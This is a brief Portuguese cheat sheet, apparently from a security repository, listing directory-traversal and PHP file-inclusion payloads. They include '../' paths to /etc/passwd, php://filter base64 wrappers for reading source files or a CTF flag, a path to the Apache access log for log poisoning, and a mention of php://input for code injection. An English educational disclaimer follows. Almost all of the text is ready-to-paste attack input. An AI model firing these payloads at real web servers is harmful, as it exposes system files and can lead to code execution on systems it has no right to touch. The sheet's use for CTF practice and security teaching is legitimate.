### Directory Traversal padrão
Sequências como ../ (ponto-ponto-barra)
- http://exemplo.com/pagina.php?arquivo=../../../../etc/passwd






### Em ambientes PHP vulneráveis, podemos usar wrappers
Como php://filter para ler o conteúdo de arquivos (geralmente codificado, para contornar a execução) ou php://input para injetar código.
- php://filter/convert.base64-encode/resource=dog/../flag
- ../../../../../../../var/log/apache2/access.log&ext   (com o "ext" podemos remover a extensão ".php" apenas definindo-a na consulta)
- http://exemplo.com/pagina.php?arquivo=php://filter/read=convert.base64-encode/resource=/etc/passwd



🛡️ Disclaimer

This repository was created for educational and cybersecurity research purposes only.
The use of any information, scripts, or tools contained herein is the sole responsibility of the user.
I am not responsible for any misuse or activity that violates local laws or third-party policies.

© [GSecurity]
